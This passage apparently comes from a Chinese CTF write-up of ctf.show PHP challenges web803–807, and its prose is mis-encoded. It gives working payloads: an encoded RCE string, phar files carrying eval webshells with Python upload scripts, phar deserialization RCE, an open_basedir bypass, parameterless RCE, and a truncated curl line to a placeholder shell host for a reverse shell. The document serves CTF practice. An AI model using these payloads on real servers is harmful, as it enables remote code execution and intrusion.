class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>D%<span class="number">28</span>%<span class="number">24</span>%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">5</span>F%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B&amp;__=system&amp;_=cat flag.php</span><br></pre></td></tr></table></figure><p><strong>è¿™é‡Œçš„payloadæ˜¯ä»rceæé™æŒ‘æˆ˜é‡Œé¢æ‹¿å‡ºæ¥çš„  ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œrceæé™æŒ‘æˆ˜é‡Œçš„payloadéƒ½å¯ä»¥é€šæ€å¤§éƒ¨åˆ†é¢˜ç›®</strong></p><h2 id="web803-pharæ–‡ä»¶åŒ…å«"><a href="#web803-pharæ–‡ä»¶åŒ…å«" class="headerlink" title="web803( pharæ–‡ä»¶åŒ…å«)"></a>web803( <strong>pharæ–‡ä»¶åŒ…å«</strong>)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜çš„æ€è·¯ï¼šè¿‡æ»¤äº†phpå’Œdataï¼Œä¸èƒ½åˆ©ç”¨è¿™å‡ ä¸ªåè®®ï¼Œåœ¨æ–‡ä»¶åŒ…å«ä¸­ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<strong>zipåè®®å’Œpharåè®®(</strong>è¿œç¨‹æ–‡ä»¶åŒ…å«è¿™ä¸ªä¸è¡Œ)</p><p><strong>file</strong>åè®®ç›´æ¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯æœ‰ä¸ªfile_existséœ€è¦å­˜åœ¨ä¸€ä¸ªtxtæ–‡ä»¶</p><p>è€Œä¸”æµ‹è¯•äº†ä¸€ä¸‹ï¼Œåªèƒ½å¾€<strong>/tmp</strong>ä¸­å»å†™å…¥æ–‡ä»¶ï¼Œç½‘ç«™ç›®å½•<strong>/var/www/html</strong>å†™ä¸è¿›å»çš„</p><p>æ—¥å¿—åŒ…å«ä¹Ÿè¿˜æ˜¯æ”¶åˆ°<strong>txt</strong>åç¼€çš„å½±å“</p><p>æ‰€ä»¥æ•´ä½“çš„æ€è·¯ï¼Œå…ˆåˆ©ç”¨<strong>file_put_contents</strong>è®²æ‰§è¡Œå‘½ä»¤çš„è¯­å¥å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œç„¶åå†é€šè¿‡<strong>include</strong>åŒ…å«</p><p>(å°±æ˜¯è¿›è¡Œä¸¤æ¬¡å‘åŒ…ï¼Œç¬¬ä¸€æ¬¡å…ˆæŠŠåˆ©ç”¨file_put_contentsæŠŠå†…å®¹å†™å…¥tmpä¸‹çš„pharå†…ï¼Œç¬¬äºŒæ¬¡åœ¨è¿›è¡Œå‘åŒ…ï¼Œè¿›è¡ŒincludeåŒ…å«ï¼Œç„¶åè¿›è¡Œå‘½ä»¤æ‰§è¡Œ)</p><p><strong>pharåè®®</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆè¿™ä¸ªpharåŒ…å¾—å…ˆä¿®æ”¹ä¸€ä¸‹php.iniçš„è®¾ç½®</p><p><img src="../images/image-20230305155029273.png" alt="image-20230305155029273"></p><p>åŸæœ¬è¿™é‡Œæ˜¯Onçš„ï¼ŒæŠŠä»–ä¿®æ”¹æˆOffå°±è¡Œ</p><p>ç„¶ååœ¨é‡å¯phpstudyå°±è¡Œäº†</p><p><strong>è„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://2ed54b8f-1578-49c9-8386-ce7c9c6f68c6.challenge.ctf.show/&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;/tmp/shell.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;phar:///tmp/shell.phar/a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url=url,data=data1)</span><br><span class="line">r = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè®°å¾—å¾—æŠŠç”Ÿæˆçš„pharåŒ…ï¼Œæ”¾åˆ°è¿™ä¸ªè„šæœ¬æ‰€åœ¨çš„ç›®å½•ä¸‹ã€‚</p><p>pharå®ç°æ–‡ä»¶åŒ…å«åŸç†ï¼šå½“ä¸åŒ…å«å‡½æ•°ç»“åˆåï¼Œä¼šç›´æ¥æ‰§è¡Œpharä¸­çš„å†…å®¹ï¼Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</p><h2 id="web804-pharååºåˆ—åŒ–"><a href="#web804-pharååºåˆ—åŒ–" class="headerlink" title="web804(pharååºåˆ—åŒ–)"></a>web804(pharååºåˆ—åŒ–)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç‰¹ç‚¹ï¼šæœ‰<code>file_put_contents</code>å®ç°æ–‡ä»¶ä¸Šä¼ çš„ç›®çš„ï¼Œå°†<code>phar</code>æ–‡ä»¶ä¸Šä¼ åˆ°é¢˜ç›®æœåŠ¡å™¨ä¸Šï¼Œç„¶å<code>file_exists</code>å’Œ<code>unlink</code>çš„å½±å“å‡½æ•°ï¼Œéƒ½å¯ä»¥è§¦å‘<code>pharçš„ååºåˆ—åŒ–</code>ï¼Œä»è€Œè¾¾åˆ°ååºåˆ—åŒ–ä¸­çš„å‘½ä»¤æ‰§è¡Œ</p><p>pharæ–‡ä»¶çš„ç”Ÿæˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hacker</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;code=<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯æ˜¯å…ˆå†™ä¸€ä¸ªååºåˆ—åŒ–é“¾å­ï¼Œç„¶ååœ¨æŠŠpharçš„éƒ¨åˆ†æ‹¼æ¥ä¸Šå»</p><p>ç„¶åä¸Šä¼ ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œå¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;http://bf1f07fe-9a6c-4425-994b+7886f64b2923.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å’Œpharæ–‡ä»¶åŒ…å«å·®ä¸å¤šçš„æ„æ€ï¼Œå¯¹äºè¿™ä¸ªè„šæœ¬æ¥è¯´ã€‚</p><p>(è¿™é‡Œä¸Šä¸€é¢˜çš„ç”ŸæˆpharåŒ…çš„æ–¹å¼æ˜¯ä¸€æ¨¡ä¸€æ ·çš„)</p><h2 id="web805-open-basedirç»•è¿‡"><a href="#web805-open-basedirç»•è¿‡" class="headerlink" title="web805(open_basedirç»•è¿‡)"></a>web805(<strong>open_basedirç»•è¿‡</strong>)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æœ‰ç‚¹ç®€ç•¥</p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/125577789">è¿™ç¯‡æ–‡ç« å†™çš„éå¸¸è¯¦ç»†äº†ï¼Œæœ‰å¥½å¤šç§æ–¹æ³•ï¼Œå¯ä»¥å»å°è¯•å°è¯•</a></p><p><a href="https://www.cnblogs.com/hookjoy/p/12846164.html">è¿™ç¯‡æ–‡ç« ä¹Ÿæ˜¯</a></p><p><img src="../images/image-20230305161156758.png" alt="image-20230305161156758"></p><p>å‘ç°åªæœ‰å½“å‰ç›®å½•å¯è¯»ã€‚</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/ctfshowflag&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯å°¾éƒ¨å¯æ§ï¼Œå¯ä»¥è¿›è¡Œæƒ³è¦çš„æŒ‡ä»¤è¿›è¡Œè¾“å…¥è¾“å‡ºã€‚  </p><p>ä¾‹å¦‚æŸ¥çœ‹æ ¹ç›®å½•çš„è¯  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p>åªè¦å°¾éƒ¨ä»£ç æ¢æ‰å°±è¡Œ</p><h2 id="web806-æ— å‚RCE"><a href="#web806-æ— å‚RCE" class="headerlink" title="web806(æ— å‚RCE)"></a>web806(æ— å‚RCE)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/9360">æ–‡ç« </a></p><p><a href="https://blog.csdn.net/qq_45570082/article/details/106602261">æ–‡ç« 2</a></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;shell=cat /c*;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„shellå‚æ•°çš„åå­—å¯ä»¥éšä¾¿æ”¹ï¼Œå› ä¸ºè¿™æ ·å†™çš„è¯æ˜¯åŠ ä¸€ä¸ªæ•°ç»„å‚æ•°åœ¨æœ€åé¢ï¼Œç„¶åendçš„æ—¶å€™å°±ä¼šé€‰åˆ°ä»–ã€‚</p><p>ç„¶åæœ€åå°±ä¼š</p><p><code>eval(system(cat /c*))</code></p><p>ç„¶åè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†</p><h2 id="web807-åå¼¹shell"><a href="#web807-åå¼¹shell" class="headerlink" title="web807(åå¼¹shell)"></a>web807(åå¼¹shell)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$schema</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>,<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$schema</span>===<span class="string">&quot;https://&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;curl <span class="subst">$url</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/ä½ çš„å…¬ç½‘ipå†’å·ä½ çš„å¼€æ”¾ç«¯å£ç©ºæ 